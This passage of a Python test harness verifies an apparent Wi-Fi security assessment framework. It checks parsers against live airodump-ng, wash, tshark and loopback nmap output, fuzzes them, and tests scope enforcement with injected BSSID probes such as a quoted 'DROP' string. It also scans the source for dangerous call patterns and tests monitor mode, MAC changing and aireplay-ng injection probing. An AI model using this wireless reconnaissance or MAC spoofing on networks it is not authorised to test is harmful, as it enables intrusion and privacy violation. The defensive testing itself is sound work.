            if isinstance(parsed, dict) and parsed.get(key):
                parsed_channels = parsed[key]
                break
        print(f"    independent: {len(raw_channels)} distinct channels in `iw list`, {raw_disabled} disabled")
        print(f"    parser:      {type(parsed).__name__} keys={list(parsed)[:8] if isinstance(parsed, dict) else 'n/a'}")
        report.record("parse_iw_list returns data for real `iw list` output", bool(parsed),
                      f"keys={list(parsed)[:8] if isinstance(parsed, dict) else parsed!r:.120}")
        if parsed_channels:
            report.record("parse_iw_list channel count matches the raw output",
                          abs(len(list(parsed_channels)) - len(raw_channels)) <= max(2, len(raw_channels) // 10),
                          f"parser={len(list(parsed_channels))} independent={len(raw_channels)} "
                          f"(tolerance for per-band duplication)")
        else:
            report.skip("parse_iw_list channel extraction", "parser exposed no channel list for this output")
    else:
        report.skip("parse_iw_list against real output", "`iw list` unavailable")

    # --- airodump-ng: the highest-value check. Real APs, real CSV. ---
    scan_iface = next((i for i in ifaces if truth_type(i) in ("monitor", "managed")), None)
    if scan_iface and shutil.which("airodump-ng"):
        print(f"\n    passive scan on {scan_iface} for {SCAN_SECONDS}s (no target, no injection)")
        csv_path = Path(f"/tmp/exercise_airodump_{os.getpid()}")
        rc, out, err = sh(
            ["airodump-ng", scan_iface, "--output-format", "csv", "--write-interval", "1",
             "-w", str(csv_path), "--write"],
            timeout=SCAN_SECONDS + 15,
        )
        csv_file = Path(f"{csv_path}-01.csv")
        if csv_file.exists():
            content = csv_file.read_text(errors="replace")
            aps, clients = p_air.parse_airodump_csv(content)
            # Independent count: rows whose first field is a MAC, below the AP header.
            independent_bssids = set()
            for line in content.splitlines():
                fields = [f.strip() for f in line.split(",")]
                if fields and MAC_RE.fullmatch(fields[0]):
                    independent_bssids.add(fields[0].upper())
            parsed_bssids = {str(a.get("bssid") or a.get("mac") or "").upper() for a in aps} - {""}
            print(f"    independent: {len(independent_bssids)} distinct BSSIDs in the CSV, {len(aps)} parsed, "
                  f"{len(clients)} clients")
            report.record("parse_airodump_csv finds every BSSID in real output",
                          independent_bssids == parsed_bssids or len(aps) >= len(independent_bssids),
                          f"only_in_raw={sorted(independent_bssids - parsed_bssids)[:6]} "
                          f"only_in_parsed={sorted(parsed_bssids - independent_bssids)[:6]}")
            if aps:
                sample = {k: v for k, v in list(aps[0].items())[:8]}
                print(f"    sample parsed AP fields: {sample}")
                report.record("parsed AP records carry channel and signal",
                              any(k in aps[0] for k in ("channel", "ch")) and
                              any(k in aps[0] for k in ("power", "signal", "rssi")),
                              f"keys={list(aps[0])[:14]}")
            else:
                report.skip("parsed AP fields", "the scan found no access points; move the adapter near one")
            ev = p_air.airodump_to_evidences(content)
            report.record("airodump_to_evidences produces evidence", bool(ev), f"{len(ev)} evidence object(s)")
            try:
                csv_file.unlink()
                for extra in csv_file.parent.glob(f"exercise_airodump_{os.getpid()}*"):
                    extra.unlink()
            except OSError:
                pass
        else:
            report.skip("parse_airodump_csv against real output",
                        f"airodump-ng produced no CSV (rc={rc}); needs root and monitor mode. "
                        f"stderr: {err.strip()[:160]}")
    else:
        report.skip("parse_airodump_csv against real output",
                    "airodump-ng not installed or no wireless interface")

    # --- wash: WPS parsing against real beacons ---
    if scan_iface and shutil.which("wash"):
        print(f"\n    wash passive WPS scan on {scan_iface} for {SCAN_SECONDS}s")
        rc, out, err = sh(["wash", "-i", scan_iface, "-C", "-t", str(SCAN_SECONDS)], timeout=SCAN_SECONDS + 20)
        if out.strip():
            parsed = p_w.parse_wash(out)
            independent = [l for l in out.splitlines() if MAC_RE.search(l.split()[0] if l.split() else "")]
            print(f"    independent: {len(independent)} MAC-bearing rows; parser: {len(parsed)}")
            report.record("parse_wash row count matches independent count",
                          len(parsed) == len(independent) or (not independent and not parsed),
                          f"parser={len(parsed)} independent={len(independent)}")
        else:
            report.skip("parse_wash against real output", f"wash returned nothing (rc={rc}): {err.strip()[:140]}")
    else:
        report.skip("parse_wash against real output", "wash not installed or no wireless interface")

    # --- nmap against loopback only: never at a third party ---
    if shutil.which("nmap"):
        print("\n    nmap against 127.0.0.1 only (loopback, no third-party hosts)")
        for flag, parser, label in (("-oG", p_nmap.parse_nmap_grepable, "grepable"),
                                    ("-oX", p_nmap.parse_nmap_xml, "xml")):
            target_file = Path(f"/tmp/exercise_nmap_{os.getpid()}")
            rc, out, err = sh(["nmap", flag, str(target_file), "-sT", "-p", "1-1024", "127.0.0.1"],
                              timeout=120)
            data = target_file.read_text(errors="replace") if target_file.exists() else out
            try:
                parsed = parser(data)
                report.record(f"parse_nmap_{label} handles real nmap output", isinstance(parsed, list),
                              f"{len(parsed)} record(s) from a loopback scan")
            except Exception as exc:
                report.record(f"parse_nmap_{label} handles real nmap output", False,
                              f"{type(exc).__name__}: {exc}")
            try:
                target_file.unlink()
            except OSError:
                pass
        rc, out, _ = sh(["nmap", "-sT", "-p", "1-100", "127.0.0.1"], timeout=120)
        try:
            parsed = p_nmap.parse_nmap_normal(out)
            report.record("parse_nmap_normal handles real nmap output", isinstance(parsed, list),
                          f"{len(parsed)} record(s)")
        except Exception as exc:
            report.record("parse_nmap_normal handles real nmap output", False, f"{type(exc).__name__}: {exc}")
    else:
        report.skip("nmap parsers against real output", "nmap not installed")

    # --- tshark ---
    if shutil.which("tshark") and scan_iface:
        print(f"\n    tshark ambient capture on {scan_iface} for 10s (counts only, no payload logged)")
        rc, out, err = sh(["tshark", "-i", scan_iface, "-a", "duration:10", "-T", "json"], timeout=40)
        try:
            parsed = p_tsh.parse_tshark_json(out)
            report.record("parse_tshark_json handles real capture", isinstance(parsed, list),
                          f"{len(parsed)} frame(s)")
        except Exception as exc:
            report.record("parse_tshark_json handles real capture", False, f"{type(exc).__name__}: {exc}")
        rc, out, err = sh(["tshark", "-i", scan_iface, "-a", "duration:5",
                           "-T", "fields", "-e", "frame.number", "-e", "wlan.sa"], timeout=30)
        try:
            parsed = p_tsh.parse_tshark_fields(out)
            report.record("parse_tshark_fields handles real capture", isinstance(parsed, list),
                          f"{len(parsed)} row(s)")
        except Exception as exc:
            report.record("parse_tshark_fields handles real capture", False, f"{type(exc).__name__}: {exc}")
    else:
        report.skip("tshark parsers against real capture", "tshark not installed or no interface")

    # --- base helpers ---
    sample = "aa:bb:cc:dd:ee:ff and 192.168.1.1 also FF:FF:FF:FF:FF:FF"
    macs = p_base.extract_macs(sample)
    ips = p_base.extract_ips(sample)
    report.record("extract_macs finds every MAC", len(macs) == 2, f"{macs}")
    report.record("extract_ips finds every IP", ips == ["192.168.1.1"], f"{ips}")
    kv = p_base.parse_key_value_output("a: 1\nb: 2\nmalformed\n")
    report.record("parse_key_value_output tolerates a malformed line", kv.get("a") == "1" and kv.get("b") == "2", f"{kv}")


# ==========================================================================
# STAGE: parser robustness - malformed input must never raise
# ==========================================================================

FUZZ_INPUTS: Dict[str, str] = {
    "empty": "",
    "whitespace": "   \n\t\n  ",
    "nul bytes": "\x00\x00\x01\x02",
    "truncated mac": "aa:bb:cc:",
    "huge single line": "A" * 200000,
    "many lines": ("00:11:22:33:44:55, 1, -50, WPA2, TestSSID\n" * 20000),
    "wrong csv columns": "a,b\nc,d,e,f,g\n",
    "broken xml": "<?xml version='1.0'?><nmaprun><host><unclosed>",
    "invalid json": "{[not json,,,",
    "unicode": "\u00e9\u4e2d\u6587\U0001f4a9 ssid",
    "ansi escapes": "\x1b[31mred\x1b[0m \x1b[2K",
    "csv with quotes": 'aa:bb:cc:dd:ee:ff,"SSID, with comma",3',
    "negative numbers": "-1,-999,-2147483648",
    "newline in field": "aa:bb:cc:dd:ee:ff\n\n\n1",
}


def stage_robustness(report: Report) -> None:
    section("STAGE 8/13: parser robustness against malformed input")

    from wifi_framework.parsers import airodump as p_air, base as p_base, iw as p_iw
    from wifi_framework.parsers import nmap as p_nmap, tshark as p_tsh, wash as p_w

    targets: List[Tuple[str, Callable[[str], Any]]] = [
        ("parse_airodump_csv", p_air.parse_airodump_csv),
        ("parse_airodump_text", p_air.parse_airodump_text),
        ("parse_iw_dev", p_iw.parse_iw_dev),
        ("parse_iw_list", p_iw.parse_iw_list),
        ("parse_iw_link", p_iw.parse_iw_link),
        ("parse_wash", p_w.parse_wash),
        ("parse_tshark_json", p_tsh.parse_tshark_json),
        ("parse_tshark_fields", p_tsh.parse_tshark_fields),
        ("parse_nmap_grepable", p_nmap.parse_nmap_grepable),
        ("parse_nmap_normal", p_nmap.parse_nmap_normal),
        ("parse_nmap_xml", p_nmap.parse_nmap_xml),
    ]

    crashes: List[str] = []
    print(f"  {len(targets)} parsers x {len(FUZZ_INPUTS)} malformed inputs "
          f"= {len(targets) * len(FUZZ_INPUTS)} cases\n")
    for pname, fn in targets:
        bad = []
        for label, payload in FUZZ_INPUTS.items():
            try:
                fn(payload)
            except Exception as exc:
                bad.append(f"{label}: {type(exc).__name__}: {str(exc)[:80]}")
        if bad:
            crashes.append(pname)
            print(f"    [FAIL] {pname}")
            for b in bad:
                print(f"             {b}")
        else:
            print(f"    [ok]   {pname}: survived all {len(FUZZ_INPUTS)} inputs")

    report.record("no parser raises on malformed input", not crashes,
                  f"{len(targets) - len(crashes)}/{len(targets)} parsers robust; failing: {', '.join(crashes)}")

    # Evidence conversion must not raise either.
    ev_fns = [("airodump_to_evidences", p_air.airodump_to_evidences), ("iw_dev_to_evidences", p_iw.iw_dev_to_evidences),
              ("wash_to_evidences", p_w.wash_to_evidences), ("tshark_to_evidences", p_tsh.tshark_to_evidences),
              ("nmap_to_evidences", p_nmap.nmap_to_evidences)]
    ev_bad = []
    for pname, fn in ev_fns:
        for label, payload in FUZZ_INPUTS.items():
            try:
                fn(payload)
            except Exception as exc:
                ev_bad.append(f"{pname}/{label}: {type(exc).__name__}")
    report.record("no evidence converter raises on malformed input", not ev_bad,
                  "\n".join(ev_bad[:8]) or f"{len(ev_fns)} converters robust")

    # Base helpers with hostile input.
    for label, payload in FUZZ_INPUTS.items():
        try:
            p_base.extract_macs(payload)
            p_base.extract_ips(payload)
            p_base.parse_key_value_output(payload)
        except Exception as exc:
            report.record(f"base helpers survive {label!r}", False, f"{type(exc).__name__}: {exc}")
            break
    else:
        report.record("base helpers survive every malformed input", True, "")


# ==========================================================================
# STAGE: engines
# ==========================================================================


def stage_engines(report: Report) -> None:
    section("STAGE 9/13: engines and the adaptive loop")

    workspace = Path(f"/tmp/exercise_workspace_{os.getpid()}")
    (workspace / "audit").mkdir(parents=True, exist_ok=True)
    (workspace / "artifacts").mkdir(parents=True, exist_ok=True)

    try:
        from wifi_framework.core.models.scope import AssessmentScope
    except Exception as exc:
        report.record("scope model importable", False, f"{type(exc).__name__}: {exc}")
        return

    # --- scope enforcement: the security boundary of the whole framework ---
    scope = AssessmentScope(authorized_bssids=["AA:BB:CC:DD:EE:FF"], authorized_ssids=["OwnNetwork"],
                            authorized_networks=["10.0.0.0/8"], strict_mode=False)
    in_bssid = scope.is_bssid_authorized("AA:BB:CC:DD:EE:FF") if hasattr(scope, "is_bssid_authorized") else None
    out_bssid = scope.is_bssid_authorized("11:22:33:44:55:66") if hasattr(scope, "is_bssid_authorized") else None
    if in_bssid is not None:
        report.record("scope authorizes an in-scope BSSID", bool(in_bssid), f"{in_bssid}")
        report.record("scope refuses an out-of-scope BSSID", out_bssid is False, f"{out_bssid}")
        lower = scope.is_bssid_authorized("aa:bb:cc:dd:ee:ff") if hasattr(scope, "is_bssid_authorized") else None
        report.record("BSSID matching is case-insensitive", bool(lower), f"{lower}")
        bad_probes: List[str] = []
        for probe in ("AA:BB:CC:DD:EE:FF'; DROP", "not-a-mac", "", "*", "AA:BB:CC:DD:EE:FG",
                      "AA:BB:CC:DD:EE:FF AA:BB:CC:DD:EE:00"):
            if scope.is_bssid_authorized(probe):
                bad_probes.append(f"{probe!r} was authorized")
        report.record("scope refuses malformed and injected BSSIDs", not bad_probes,
                      "; ".join(bad_probes) or "every malformed probe denied")
    else:
        report.skip("scope BSSID enforcement", "AssessmentScope exposes no is_bssid_authorized")

    ssid_ok = scope.is_ssid_authorized("OwnNetwork") if hasattr(scope, "is_ssid_authorized") else None
    if ssid_ok is not None:
        report.record("scope authorizes an in-scope SSID", bool(ssid_ok), f"{ssid_ok}")
        report.record("scope refuses an out-of-scope SSID",
                      scope.is_ssid_authorized("NeighbourNetwork") is False, "")
        report.record("scope refuses a regex-injection SSID",
                      scope.is_ssid_authorized(".*") is False, "'.*' must not match everything")
    net_ok = scope.is_network_authorized("10.1.2.3") if hasattr(scope, "is_network_authorized") else None
    if net_ok is not None:
        report.record("scope authorizes an in-scope host", bool(net_ok), f"{net_ok}")
        report.record("scope refuses an out-of-scope host",
                      scope.is_network_authorized("8.8.8.8") is False, "")

    # --- each engine constructs and exposes its documented behaviour ---
    engine_checks: List[Tuple[str, str, Dict[str, Any]]] = [
        ("DecisionEngine", "wifi_framework.core.decision.engine", {}),
        ("EvidenceEngine", "wifi_framework.core.evidence.engine", {}),
        ("VerificationEngine", "wifi_framework.core.verification.engine", {}),
        ("ExperienceEngine", "wifi_framework.core.experience.engine", {}),
        ("AuditLogger", "wifi_framework.core.audit.logger",
         {"log_dir": str(workspace / "audit")}),
        ("InterfaceManager", "wifi_framework.core.execution.interface_manager", {}),
        ("CapabilityChecker", "wifi_framework.core.execution.capability_checker", {}),
        ("ActionPolicy", "wifi_framework.core.policy.validator", {}),
        ("WorldModel", "wifi_framework.core.models.world_model", {}),
        ("AssessmentState", "wifi_framework.core.models.assessment_state", {}),
        ("WorldModelApplier", "wifi_framework.core.world.applier", {}),
        ("WorldStatePublisher", "wifi_framework.core.world.state_publisher", {}),
        ("UncertaintyIdentifier", "wifi_framework.core.planning.uncertainty", {}),
        ("ActionSelector", "wifi_framework.core.planning.action_selector", {}),
        ("AssessmentPlanner", "wifi_framework.core.planning.planner", {}),
        ("ContractRegistryView", "wifi_framework.core.decision.state_view", {}),
        ("ExecutionGateway", "wifi_framework.core.execution.gateway", {}),
        ("CapabilityExecutor", "wifi_framework.core.execution.executor", {}),
        ("ArtifactStore", "wifi_framework.core.execution.artifacts",
         {"base_dir": str(workspace / "artifacts")}),
        ("DependencyResolver", "wifi_framework.core.execution.dependency_resolver", {}),
        ("ExperienceStore", "wifi_framework.core.experience.store", {}),
        ("CapabilityRegistry", "wifi_framework.core.execution.registry", {}),
    ]

    constructed = 0
    for label, modpath, kwargs in engine_checks:
        try:
            mod = importlib.import_module(modpath)
        except Exception as exc:
            report.record(f"{label} module imports", False, f"{type(exc).__name__}: {exc}")
            continue
        cls = getattr(mod, label, None)
        if cls is None:
            candidates = [n for n in dir(mod) if n.endswith(("Engine", "Registry", "Logger", "Manager",
                                                             "Checker", "Validator", "Model", "State",
                                                             "Applier", "Selector", "Identifier"))]
            report.record(f"{label} exists in {modpath}", False, f"found instead: {candidates[:8]}")
            continue
        try:
            obj = cls(**kwargs) if kwargs else _construct(cls)
            constructed += 1
            public = [n for n in dir(obj) if not n.startswith("_") and callable(getattr(obj, n, None))]
            print(f"    [ok] {label}: {len(public)} public methods")
        except Exception as exc:
            report.record(f"{label} constructs", False, f"{type(exc).__name__}: {exc}")
    report.record("every engine constructs", constructed == len(engine_checks),
                  f"{constructed}/{len(engine_checks)}")

    # --- the full adaptive loop, bounded, with an empty in-scope world ---
    try:
        from wifi_framework.core.audit.logger import AuditLogger
        from wifi_framework.core.engine.assessment_engine import AssessmentEngine

        logger = AuditLogger(log_dir=str(workspace / "audit"))
        engine = AssessmentEngine(scope, audit_logger=logger, artifact_dir=str(workspace / "artifacts"))
        state = engine.run(max_iterations=3, timeout_per_action=15, auto_discover=True)
        report.record("the adaptive loop completes 3 iterations without crashing", state is not None,
                      f"returned {type(state).__name__}")
        for attr in ("iteration", "current_iteration", "phase", "current_phase"):
            if hasattr(state, attr):
                print(f"    state.{attr} = {getattr(state, attr)}")
        for attr in ("access_points", "clients", "evidence", "findings", "execution_history"):
            if hasattr(state, attr):
                val = getattr(state, attr)
                try:
                    print(f"    state.{attr}: {len(val)} item(s)")
                except TypeError:
                    print(f"    state.{attr}: {val!r}"[:110])
        events: List[str] = []
        for path in sorted((workspace / "audit").glob("*.jsonl")):
            for line in path.read_text(errors="replace").splitlines():
                if line.strip():
                    try:
                        import json

                        events.append(json.loads(line).get("event_type", "?"))
                    except Exception:
                        events.append("<unparseable>")
        report.record("the loop wrote an audit trail", bool(events),
                      f"{len(events)} events: {sorted(set(events))[:12]}")
        report.record("no audit event is unparseable JSON", "<unparseable>" not in events,
                      f"{events.count('<unparseable>')} bad line(s)")
    except Exception as exc:
        report.record("the adaptive loop runs end to end", False,
                      f"{type(exc).__name__}: {exc}\n{traceback.format_exc(limit=6)}")

    # --- WorldStateView over a real WorldState contract -------------------
    # Construction alone proves little; the view exists so the planner can read a
    # contract message as if it were an AssessmentState, so check that mirroring.
    try:
        from wifi_framework.contracts.world_state import WorldState
        from wifi_framework.core.decision.state_view import WorldStateView

        ws = WorldState(
            assessment_id="EXERCISE-RUN",
            phase="wireless_observation",
            scope={},
            channels_observed=[11, 1, 6],
            ssids_observed=["OwnNetwork"],
            last_updated=datetime.now(timezone.utc).isoformat(),
        )
        view = WorldStateView(ws)
        report.record("WorldStateView constructs over a real WorldState", True,
                      f"id={getattr(view, 'id', None)!r} phase={getattr(view, 'phase', None)!r}")
        report.record("WorldStateView mirrors the contract's identity and phase",
                      getattr(view, "id", None) == "EXERCISE-RUN" and view.phase is not None,
                      f"id={getattr(view, 'id', None)!r} (expected 'EXERCISE-RUN') phase={view.phase!r}")
        # The view exists so AssessmentPlanner can read a contract message as if
        # it were an AssessmentState. Check the attributes the planner actually
        # dereferences, rather than assuming a field name.
        planner_reads = ("available_capabilities", "execution_history", "interfaces",
                         "phase", "uncertainties", "world_model")
        instance = WorldStateView(ws)
        absent = [a for a in planner_reads if not hasattr(instance, a)]
        report.record("WorldStateView exposes every attribute the planner reads",
                      not absent,
                      f"missing={absent}" if absent else f"all {len(planner_reads)} present")

        # --- contract round trip: message -> parse -> identical digest -----
        message = ws.to_message()
        report.record("WorldState.to_message() produces an envelope",
                      isinstance(message, dict) and "schema" in message and "version" in message,
                      f"envelope keys={sorted(message)[:10]}")
        restored = WorldState.parse(message)
        report.record("WorldState survives a serialise/parse round trip",
                      restored.digest() == ws.digest(),
                      f"digest {ws.digest()[:16]}... == {restored.digest()[:16]}...")
        for required in ("schema", "version", "message_id", "assessment_id", "timestamp", "source_engine"):
            report.record(f"envelope carries the required field {required!r}", required in message,
                          f"present={required in message}")
        # A tampered message must be rejected rather than silently accepted.
        tampered = dict(message)
        tampered["timestamp"] = "2026-09-16T12:00:00"  # naive, no UTC offset
        try:
            WorldState.parse(tampered)
            report.record("a naive timestamp is rejected on parse", False, "parse() accepted it")
        except Exception as exc:
            report.record("a naive timestamp is rejected on parse", True, f"{type(exc).__name__}")
    except Exception as exc:
        report.record("WorldStateView and contract round trip", False,
                      f"{type(exc).__name__}: {exc}\n{traceback.format_exc(limit=5)}")

    # --- contract pipeline round trip ---
    try:
        from wifi_framework.contracts.registry import build_default_registry

        reg = build_default_registry()
        desc = reg.describe()
        report.record("ContractRegistry.describe() returns a description", isinstance(desc, dict) and bool(desc),
                      f"{len(desc)} key(s): {list(desc)[:8]}")
    except Exception as exc:
        report.record("ContractRegistry.describe()", False, f"{type(exc).__name__}: {exc}")


def _construct(cls) -> Any:
    """Instantiate with the least-argument path available, so a required
    collaborator does not masquerade as a broken engine."""
    try:
        return cls()
    except TypeError:
        import inspect

        sig = inspect.signature(cls.__init__)
        kwargs = {}
        for pname, param in sig.parameters.items():
            if pname == "self" or param.default is not inspect.Parameter.empty:
                continue
            ann = str(param.annotation)
            if "registry" in pname.lower():
                from wifi_framework.core.execution.registry import CapabilityRegistry
                from wifi_framework.tools.registry_loader import load_all_adapters

                kwargs[pname] = load_all_adapters(CapabilityRegistry())
            elif "scope" in pname.lower():
                from wifi_framework.core.models.scope import AssessmentScope

                kwargs[pname] = AssessmentScope()
            elif "store" in pname.lower():
                kwargs[pname] = None
            else:
                kwargs[pname] = None
        return cls(**kwargs)


# ==========================================================================
# STAGE: security invariants
# ==========================================================================


def stage_security(report: Report) -> None:
    section("STAGE 10/13: security invariants across the whole tree")

    import ast

    exec_hits, shell_hits, eval_hits = [], [], []
    files = 0
    for path in sorted(_SRC.rglob("*.py")):
        if "__pycache__" in path.parts:
            continue
        files += 1
        try:
            tree = ast.parse(path.read_text(errors="replace"))
        except SyntaxError as exc:
            exec_hits.append(f"{path}: does not parse: {exc}")
            continue
        for node in ast.walk(tree):
            if isinstance(node, ast.Call) and isinstance(node.func, ast.Name):
                if node.func.id in ("exec", "compile"):
                    exec_hits.append(f"{path.relative_to(_REPO)}:{node.lineno} {node.func.id}()")
                elif node.func.id == "eval":
                    eval_hits.append(f"{path.relative_to(_REPO)}:{node.lineno} eval()")
            if isinstance(node, ast.keyword) and node.arg == "shell":
                if isinstance(node.value, ast.Constant) and node.value.value is True:
                    shell_hits.append(f"{path.relative_to(_REPO)}:{node.lineno} shell=True")

    print(f"  scanned {files} source files with ast")
    for h in exec_hits:
        print(f"    [FAIL] {h}")
    for h in eval_hits:
        print(f"    [FAIL] {h}")
    for h in shell_hits:
        print(f"    [FAIL] {h}")
    report.record("no exec()/compile() on caller data anywhere in src/", not exec_hits,
                  "\n".join(exec_hits[:6]) or f"{files} files clean")
    report.record("no eval() anywhere in src/", not eval_hits, "\n".join(eval_hits[:6]) or "clean")
    report.record("no subprocess shell=True anywhere in src/", not shell_hits,
                  "\n".join(shell_hits[:6]) or "clean")

    # Textual sweep for other dangerous patterns the AST pass would miss in strings.
    dangerous = [r"os\.system\s*\(", r"subprocess\.getoutput\s*\(", r"popen\s*\(\s*[^]]*shell\s*=\s*True",
                 r"__import__\s*\(\s*['\"]os['\"]"]
    text_hits = []
    for path in sorted(_SRC.rglob("*.py")):
        if "__pycache__" in path.parts:
            continue
        content = path.read_text(errors="replace")
        for pat in dangerous:
            for m in re.finditer(pat, content):
                line_no = content[: m.start()].count("\n") + 1
                text_hits.append(f"{path.relative_to(_REPO)}:{line_no} matches {pat}")
    for h in text_hits[:10]:
        print(f"    [FAIL] {h}")
    report.record("no os.system / getoutput / __import__('os') in src/", not text_hits,
                  "\n".join(text_hits[:6]) or "clean")

    # Hardcoded credentials would be a serious finding in a security tool.
    secret_pat = re.compile(r"(password|passwd|secret|api_?key|token)\s*=\s*['\"][^'\"]{6,}['\"]", re.I)
    secrets = []
    for path in sorted(_SRC.rglob("*.py")):
        if "__pycache__" in path.parts:
            continue
        for i, line in enumerate(path.read_text(errors="replace").splitlines(), 1):
            if secret_pat.search(line) and "os.environ" not in line and "getenv" not in line:
                secrets.append(f"{path.relative_to(_REPO)}:{i} {line.strip()[:90]}")
    for s in secrets[:10]:
        print(f"    [note] {s}")
    report.record("no hardcoded credentials in src/", not secrets,
                  "\n".join(secrets[:6]) or "clean")


# ==========================================================================
# STAGE: test suite
# ==========================================================================


def stage_tests(report: Report) -> None:
    section("STAGE 11/13: the project's own test suite")

    if not shutil.which("pytest") and importlib.util.find_spec("pytest") is None:
        report.skip("test suite", "pytest not installed: pip install pytest")
        return

    rc, out, err = sh([sys.executable, "-m", "pytest", "-q", "--no-header", "-p", "no:cacheprovider"],
                      timeout=1800, cwd=str(_REPO))
    tail = "\n".join((out or err).strip().splitlines()[-40:])
    print(tail)
    m = re.search(r"(\d+) passed", out or err)
    passed = int(m.group(1)) if m else 0
    f = re.search(r"(\d+) failed", out or err)
    failed = int(f.group(1)) if f else 0
    e = re.search(r"(\d+) error", out or err)
    errors = int(e.group(1)) if e else 0
    report.record("the full test suite passes", rc == 0 and failed == 0 and errors == 0,
                  f"{passed} passed, {failed} failed, {errors} errors (rc={rc})")


# ==========================================================================
# STAGE: hardware - the physical adapter
# ==========================================================================


def stage_hardware(report: Report, ifaces: List[str]) -> Optional[str]:
    section("STAGE 12/13: hardware - monitor mode, channels, MAC, injection probe")

    if not ifaces:
        report.skip("hardware stage", "no wireless interface; nothing to exercise")
        return None
    if os.geteuid() != 0:
        report.skip("hardware stage", "needs root: sudo python3 scripts/exercise_framework.py")
        return ifaces[0]

    iface = next((i for i in ifaces if i != "hwsim0"), ifaces[0])
    print(f"  target interface: {iface}")

    original = {
        "type": truth_type(iface),
        "mac": truth_mac(iface),
        "up": truth_is_up(iface),
        "channel": truth_channel(iface),
    }
    print(f"  original state: {original}")

    try:
        # --- driver / chipset capability ---
        from wifi_framework.core.execution.interface_manager import InterfaceManager

        im = InterfaceManager()
        info = im.get_interface_info(iface)
        report.record("framework returns interface info", info is not None, f"{type(info).__name__ if info else None}")
        if info is not None:
            claimed_mac = str(getattr(info, "mac", "") or "").upper()
            report.record("framework MAC matches sysfs", claimed_mac == (original["mac"] or ""),
                          f"framework={claimed_mac} sysfs={original['mac']}")
            claimed_type = getattr(info, "type", None)
            report.record("framework interface type matches `iw`", claimed_type == original["type"],
                          f"framework={claimed_type!r} iw={original['type']!r}")
            report.record("framework reports a driver", bool(getattr(info, "driver", None)),
                          f"driver={getattr(info, 'driver', None)!r}")
            print(f"    supports_monitor={getattr(info, 'supports_monitor', None)} "
                  f"supports_injection={getattr(info, 'supports_injection', None)}")

        # --- monitor mode ---
        ok, msg = im.set_monitor_mode(iface) if hasattr(im, "set_monitor_mode") else (False, "no set_monitor_mode")
        observed = truth_type(iface)
        report.record("set_monitor_mode actually changes the type", observed == "monitor",
                      f"claimed={ok} ({str(msg)[:60]}) observed type={observed!r}")

        if observed == "monitor":
            # --- channels, verified from `iw` ---
            for ch in (1, 6, 11):
                if hasattr(im, "set_channel"):
                    cok, cmsg = im.set_channel(iface, ch)
                    got = truth_channel(iface)
                    report.record(f"set_channel({ch}) takes effect", got == ch,
                                  f"claimed={cok} observed channel={got}")

            # --- MAC change, verified from sysfs ---
            target_mac = "02:00:00:00:00:AA"
            if hasattr(im, "change_mac"):
                mok, mmsg = im.change_mac(iface, target_mac)
                got = truth_mac(iface)
                report.record("change_mac to an explicit address takes effect", got == target_mac,
                              f"claimed={mok} sysfs={got}")
                if hasattr(im, "randomize_mac"):
                    rok, rmsg = im.randomize_mac(iface)
                    got = truth_mac(iface) or ""
                    locally_administered = len(got.split(":")) == 6 and (int(got.split(":")[0], 16) & 0x02) == 0x02
                    report.record("randomize_mac sets the locally-administered bit",
                                  bool(rok) and locally_administered and got != target_mac,
                                  f"claimed={rok} sysfs={got}")

            # --- the injection probe: self-directed, targets no network ---
            if shutil.which("aireplay-ng"):
                print(f"\n    aireplay-ng --test {iface} (self-directed; targets no access point)")
                rc, out, err = sh(["aireplay-ng", "--test", iface], timeout=40)
                combined = out + err
                for line in combined.strip().splitlines()[-14:]:
                    print(f"      | {line}")
                working = "Injection is working" in combined
                not_working = "Injection is not working" in combined
                report.record("aireplay-ng --test produced a verdict", working or not_working,
                              f"working={working} not_working={not_working}"
                              + ("" if (working or not_working) else f" raw tail={combined.strip()[-160:]!r}"))

                # The high-value cross-check: does the framework's claim match ground truth?
                if hasattr(im, "get_deep_capabilities"):
                    try:
                        deep = im.get_deep_capabilities(iface)
                        claimed = bool(getattr(deep, "supports_injection", None))
                        tested = bool(getattr(deep, "injection_tested", None))
                        result_text = str(getattr(deep, "injection_test_result", "") or "")
                        report.record("framework supports_injection matches aireplay-ng ground truth",
                                      (claimed == working) if working or not_working else True,
                                      f"framework claims injection={claimed} (tested={tested}) "
                                      f"vs aireplay-ng working={working}; result={result_text[:120]!r}")
                    except Exception as exc:
                        report.record("deep capability probe runs", False, f"{type(exc).__name__}: {exc}")
                else:
                    tm = None
                    try:
                        from wifi_framework.core.execution.tool_manager import ToolManager

                        tm = ToolManager()
                        if hasattr(tm, "check_interface_deep"):
                            deep = tm.check_interface_deep(iface)
                            claimed = bool(getattr(deep, "supports_injection", None))
                            report.record("framework supports_injection matches aireplay-ng ground truth",
                                          claimed == working if (working or not_working) else True,
                                          f"framework={claimed} aireplay-ng working={working}")
                    except Exception as exc:
                        print(f"    (deep capability probe unavailable: {type(exc).__name__}: {exc})")
                        report.skip("supports_injection ground-truth cross-check",
                                    "no deep-capability entry point found on this build")
            else:
                report.skip("injection probe", "aireplay-ng not installed (apt install aircrack-ng)")

            # --- channel list from a real chipset ---
            if hasattr(im, "get_supported_channels"):
                chans = im.get_supported_channels(iface)
                rc, out, _ = sh(["iw", "list"])
                raw = set(re.findall(r"\*\s+[\d.]+\s+MHz\s+\[(\d+)\]", out))
                raw_enabled = {c for c in raw}
                print(f"    framework channels: {len(chans) if chans else 0}; `iw list` distinct: {len(raw_enabled)}")
                report.record("get_supported_channels returns channels for a real chipset",
                              bool(chans), f"{len(chans) if chans else 0} channel(s)")
                if chans:
                    as_ints = {int(c) for c in chans if str(c).isdigit()}
                    report.record("every channel the framework claims appears in `iw list`",
                                  as_ints <= raw_enabled or not raw_enabled,
                                  f"claimed-only={sorted(as_ints - raw_enabled)[:10]}")
        else:
            report.skip("channel/MAC/injection checks", f"could not enter monitor mode (type={observed!r})")
    finally:
        print("\n  --- restoring original interface state ---")
        try:
            from wifi_framework.core.execution.interface_manager import InterfaceManager

            im = InterfaceManager()
            if original["mac"] and hasattr(im, "change_mac"):
                sh(["ip", "link", "set", iface, "down"])
                im.change_mac(iface, original["mac"])
            if original["type"] and truth_type(iface) != original["type"]:
                sh(["ip", "link", "set", iface, "down"])
                sh(["iw", "dev", iface, "set", "type", original["type"]])
            sh(["ip", "link", "set", iface, "up" if original["up"] else "down"])
        except Exception as exc:
            print(f"    restoration error: {type(exc).__name__}: {exc}")
        print(f"    now: type={truth_type(iface)} mac={truth_mac(iface)} up={truth_is_up(iface)}")
        report.record("interface restored to its original type", truth_type(iface) == original["type"],
                      f"now={truth_type(iface)!r} original={original['type']!r}")
        report.record("interface restored to its original MAC", truth_mac(iface) == original["mac"],
